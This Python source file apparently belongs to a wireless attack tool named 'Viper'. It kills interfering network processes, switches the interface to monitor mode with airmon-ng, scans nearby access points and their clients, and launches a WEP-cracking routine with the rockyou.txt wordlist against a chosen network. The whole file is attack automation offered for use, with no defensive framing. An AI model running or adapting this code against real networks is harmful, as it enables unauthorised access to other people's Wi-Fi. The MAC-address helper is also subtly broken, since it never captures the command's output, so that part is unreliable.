from Viper.scan.scan import scan_aps
from Viper.util.read import read_csv
from Viper.attack.wep import wep_crack

import subprocess
import re


class Viper:
    def __init__(self):
        self.interface = self.init_interface()
        self.mac = self.get_mac_address()

    def init_interface(self):
        """
        Initiate wireless network interface for monitor mode.
        """
        subprocess.run(['airmon-ng', 'check', 'kill'])
        output = subprocess.run(
            'iwconfig', capture_output=True).stdout.decode()

        try:
            interface = output.split()[0]
        except:
            raise Exception('No Wireless interface.')

        mode = re.findall('Mode:\w*', output)[0].split('Mode:')[1]
        if mode.lower() == 'managed' or mode.lower() == 'auto':
            subprocess.run(['airmon-ng', 'start', interface],
                           stdout=subprocess.DEVNULL)

        output = subprocess.run(
            'iwconfig', capture_output=True).stdout.decode()
        interface = output.split()[0]

        return interface

    def get_mac_address(self):
        return subprocess.run(['cat', f'/sys/class/net/{self.interface}/address']).stdout

    def scan(self, seconds):
        """
        Scan all available access points and return all available information.
        """
        path = scan_aps(self.interface, seconds)

        self.directory = '/'.join(_ for _ in path.split('.')
                                  [0].split('/')[:-1])
        ap_list, station_list = read_csv(path, self.directory)

        self.ap = ap_list[1:]
        self.stations = station_list[1:]

    def attack(self, index):

        ap = self.ap[index]

        client_index = 0

        for i in self.stations:
            if i['BSSID'] == ap['BSSID']:
                break
            client_index += 1

        try:
            client = self.stations[client_index]
        except:
            client = dict()
            client['StationMAC'] = ''

        print(client['StationMAC'])

        if 'WEP' in ap['Privacy']:
            print('Starting Attack...')
            wep_crack(self.interface, ap['BSSID'], client['StationMAC'],
                      ap['channel'], self.directory, 90, '/usr/share/wordlists/rockyou.txt')
